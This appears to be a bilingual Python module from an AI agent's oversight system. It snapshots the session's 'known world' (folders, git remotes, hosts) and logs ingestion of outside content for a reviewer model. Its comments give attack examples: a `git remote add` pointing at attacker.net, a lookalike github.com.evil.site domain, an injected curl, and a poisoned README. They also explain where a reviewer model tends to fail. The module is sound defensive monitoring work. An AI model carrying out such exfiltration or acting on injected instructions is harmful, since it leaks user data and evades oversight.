"""[中文] 会话事实（Session facts）— 会话开始时已经熟悉的环境，以及自那之后从外部到达的内容。

两者都是确定性的：没有任何模型参与两者的产生。**在 v1 中，两者都不会改变裁决。**
已知世界作为定位信息被渲染进审核员的提示词前缀中（步骤 2）；外部摄入（ingestion）写入审计日志，没有任何代码去读取它。
这是经过深思熟虑的设计 — 现在将其记录下来意味着 v2 的核心问题（“这一事实是否会改变裁决？”）可以通过重放影子运行来回答，
而不是重新争论。

规范设计记录：`ocw-context/docs/reviewed-auto-mode.md` Part 0 与 §2.4。

[English]
Session facts — what was already familiar when the session began, and what arrived from
outside since.

Both are deterministic: no model is involved in producing either. **In v1 neither changes a
decision.** The known world is rendered into the reviewer's prefix as orientation (step 2);
ingestion goes to the audit log and nothing reads it. That is deliberate — recording it now
means the v2 question ("would this fact have changed a verdict?") is answerable by replaying
a shadow run instead of re-arguing it.

Design of record: `ocw-context/docs/reviewed-auto-mode.md` Part 0 and §2.4.
"""

from __future__ import annotations

import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterable, Optional
from urllib.parse import urlsplit

# [中文] 工具结果带有来自本机外部内容的工具类别。按类别而非工具名称列表进行索引，
# 以便新连接器在发布之日就能被覆盖：
#   web        web_fetch, web_search
#   connector  gmail, slack, notion, … — 任何读取第三方服务的工具
#   mcp        第三方 MCP 工具，按构造其来源未知
# 故意省略：`search`（这是本地 `grep`）、`filesystem`、`git`、`shell`。
# `messaging` 也被省略 — `send_message` / `send_file` 向外推送数据，而不是向内拉取数据。
# 本地读取被故意排除：如果计入它们，每一轮对话都会变成摄入轮次，这将抹杀信号。
# 排除该项的代价已记录在规范中 — 克隆仓库中带毒的 README 会在没有任何事实记录的情况下注入。
# [English]
# Tool categories whose results carry content from outside this machine. Keyed on the
# category rather than a list of tool names so new connectors are covered the day they ship:
#   web        web_fetch, web_search
#   connector  gmail, slack, notion, … — anything reading a third-party service
#   mcp        third-party MCP tools, provenance unknown by construction
# Deliberately absent: `search` (that's local `grep`), `filesystem`, `git`, `shell`.
# `messaging` is absent too — `send_message` / `send_file` push data out, they don't pull it
# in. Local reads are excluded on purpose: count them and every turn becomes an ingestion
# turn, which kills the signal. The cost of that exclusion is recorded in the spec — a
# poisoned README in a cloned repo injects with no fact at all.
INGESTING_CATEGORIES = frozenset({"web", "connector", "mcp"})


def is_ingesting(metadata: Any) -> bool:
    """[中文] 当此工具的结果可能包含机器外部创建的内容时为 True。
    [English] True when this tool's result can carry content authored outside the machine."""
    return getattr(metadata, "category", "") in INGESTING_CATEGORIES


def ingestion_source(arguments: dict[str, Any] | None) -> str:
    """[中文] 内容来源的简短、非标识性标签 — 当调用指定了主机名时为主机名，否则为 `-`。
    绝非内容本身，也绝不是完整的 URL：查询字符串正是携带 payload 的典型载体。
    [English] A short, non-identifying label for where content came from — a hostname when the
    call names one, `-` otherwise. Never the content itself, and never a full URL: a query
    string is exactly the kind of thing that carries a payload."""
    raw = str((arguments or {}).get("url", "")).strip()
    if not raw:
        return "-"
    return (urlsplit(raw).hostname or "-").lower()


def _git_remotes(cwd: Path) -> tuple[tuple[str, str], ...]:
    """[中文] 每个 remote 的 `(name, url)`，已去重（git 分别打印 fetch 和 push）。

    设计上遵循尽力而为（best-effort）：没有 git、非 git 仓库或超时挂起都会产生空元组。
    空的已知世界只会让审核员少一些定位信息，绝不会阻塞会话。

    [English] `(name, url)` per remote, deduplicated (git prints fetch and push separately).

    Best-effort by design: no git, not a repo, or a hang all yield an empty tuple. An empty
    known world is a reviewer with less orientation, never a blocked session.
    """
    try:
        proc = subprocess.run(
            ["git", "remote", "-v"],
            cwd=str(cwd),
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
    except (OSError, subprocess.SubprocessError):
        return ()
    seen: dict[str, str] = {}
    for line in proc.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 2:
            seen.setdefault(parts[0], parts[1])
    return tuple(seen.items())


@dataclass(frozen=True)
class KnownWorld:
    """[中文] 会话开始时用户已在工作的环境。特意设为不可变（frozen）。

    不可变性赋予其价值：与*实时*状态相比，执行了 `git remote add backup https://attacker.net/r.git` 的 Agent
    会使它自己的目标看起来很熟悉。而与它行动前捕获的快照对比，它无法做到这一点。

    “已知（Known）”意味着*熟悉（familiar）*，绝非*安全（safe）* — 没有人做出过任何决定，用户只是以前在这里工作过。
    措辞很重要，因为审核员会阅读它：如果被告知某物是“受信任的（trusted）”，模型会将其视为定心丸。
    （`workspace_trust.json` 保留了 "trusted" 一词，因为那确实是一个决策。）

    [English] Where the user was already working when the session started. Frozen on purpose.

    Freezing is what makes it useful: compared against the *live* state, an agent that runs
    `git remote add backup https://attacker.net/r.git` would make its own destination look
    familiar. Compared against a snapshot taken before it acted, it cannot.

    "Known" means *familiar*, never *safe* — nobody decided anything, the user has simply
    worked here before. The wording matters because the reviewer reads it: told something is
    "trusted", a model weighs it as reassurance. (`workspace_trust.json` keeps the word
    "trusted" because that one IS a decision.)
    """

    roots: tuple[tuple[str, bool], ...] = ()  # (path, writable)
    remotes: tuple[tuple[str, str], ...] = ()  # (name, url)
    hosts: tuple[str, ...] = ()  # NOT rendered — see `render`
    captured_at: float = 0.0

    def render(self) -> str:
        """[中文] 置于审核员提示词缓存前缀中的代码块。

        **仅限文件夹和 remote。** 主机名保存在 `hosts` 中，但特意不予展示：主机名列表仅对能够回答
        “该目标是否在列表中？”的审核员有用，而这是一种后缀匹配（`host == dom or host.endswith("." + dom)`），
        大模型经常弄错而 Python 不会。在访问 `github.com.evil.site` 的操作旁边打印 `github.com` 会诱导错误答案
        而非防止错误。文件夹和 remote 没有这种陷阱 — 评判它们是“这是我被告知的那个东西吗？”，而不是字符串算术。

        `hosts` 保留用于 v2 中的 `DST-1`，它将作为一行*计算后的*结果呈现，而绝非交给模型搜索的列表。

        [English] The block that sits in the reviewer prompt's cached prefix.

        **Folders and remotes only.** Hostnames are held in `hosts` but deliberately not
        shown: a host list is only useful to a reviewer that can answer "is this destination
        in the list?", and that is a suffix match (`host == dom or host.endswith("." + dom)`)
        which models get wrong and Python does not. Printing `github.com` beside an action
        reaching `github.com.evil.site` invites the wrong answer rather than preventing it.
        Folders and remotes carry no such trap — judging them is "is this the thing I was
        told about?", not string arithmetic.

        `hosts` is kept for `DST-1` in v2, which will surface it as one *computed* line and
        never as a list for the model to search.
        """
        lines = ["KNOWN WORLD (frozen when this session started)"]
        for path, writable in self.roots:
            lines.append(
                f"  folder   {path}  [{'read-write' if writable else 'read-only'}]"
            )
        for name, url in self.remotes:
            lines.append(f"  remote   {name} -> {url}")
        return "\n".join(lines) if len(lines) > 1 else ""


def capture(
    *,
    roots: Iterable[Any] | None = None,
    allowed_domains: Iterable[str] | None = None,
    workspace: Optional[Path] = None,
) -> KnownWorld:
    """[中文] 拍摄快照。在会话开始时、Agent 行动之前调用一次。
    [English] Take the snapshot. Called once, at session start, before the agent has acted."""
    root_list = list(roots or [])
    rendered_roots = tuple(
        (str(getattr(r, "path", r)), bool(getattr(r, "writable", False)))
        for r in root_list
    )

    cwd = workspace
    if cwd is None and root_list:
        cwd = Path(str(getattr(root_list[0], "path", root_list[0])))
    remotes = _git_remotes(cwd) if cwd else ()

    hosts = {d.strip().lower() for d in (allowed_domains or []) if d and d.strip()}
    for _name, url in remotes:
        host = urlsplit(url if "://" in url else "//" + url.replace(":", "/", 1)).hostname
        if host:
            hosts.add(host.lower())

    return KnownWorld(
        roots=rendered_roots,
        remotes=remotes,
        hosts=tuple(sorted(hosts)),
        captured_at=time.time(),
    )


@dataclass
class Ingestion:
    """[中文] 一次外部内容的到达。事实及其来源 — 绝非内容本身。

    在任何消费此记录之前，值得记住两个特性：

    * **它绝不提出指控。** 对于遵循在 Issue 中发现的文档链接的 Agent，与运行注入的 `curl` 的 Agent，
      记录是完全相同的，因为在两种情况下 Agent 确实都阅读了该 Issue。它提高了证明责任；评判范围是将两者区分开的关键。
    * **它的缺失并非干净会话的证明。** 本地读取被排除在外，因此工作区中已存在的带毒文件根本不会产生任何记录。

    [English] One arrival of outside content. The fact and its source — never the content.

    Two properties worth keeping in mind before anything consumes this:

    * **It never accuses.** The record is identical for an agent following a documentation
      link found in an issue and for one running an injected `curl`, because in both cases
      the agent really did read that issue. It raises the burden of proof; judging scope is
      what separates the two.
    * **Its absence is not proof of a clean session.** Local reads are excluded, so a
      poisoned file already in the workspace produces no record at all.
    """

    turn: int
    tool: str
    source: str

    def to_audit(self) -> dict[str, Any]:
        return {
            "stage": "ingested",
            "status": "external",
            "reason": f"turn {self.turn} · {self.source}",
        }


@dataclass
class SessionFacts:
    """[中文] 已知世界加上逐轮摄入记录。

    `turn` 由引擎在每个用户轮次开始时递增，以便对摄入进行归因。v1 中没有任何内容读取 `ingestions` —
    它的存在是为了让审计日志具有基线；参见模块 docstring。

    [English] The known world plus the per-turn ingestion record.

    `turn` is bumped by the engine at the start of each user turn so ingestion can be
    attributed. Nothing in v1 reads `ingestions` — it exists so the audit log has a
    baseline; see the module docstring.
    """

    world: KnownWorld = field(default_factory=KnownWorld)
    turn: int = 0
    ingestions: list[Ingestion] = field(default_factory=list)

    def begin_turn(self) -> None:
        self.turn += 1

    def note(self, tool: str, arguments: dict[str, Any] | None) -> Ingestion:
        record = Ingestion(self.turn, tool, ingestion_source(arguments))
        self.ingestions.append(record)
        return record

    def this_turn(self) -> list[Ingestion]:
        return [i for i in self.ingestions if i.turn == self.turn]
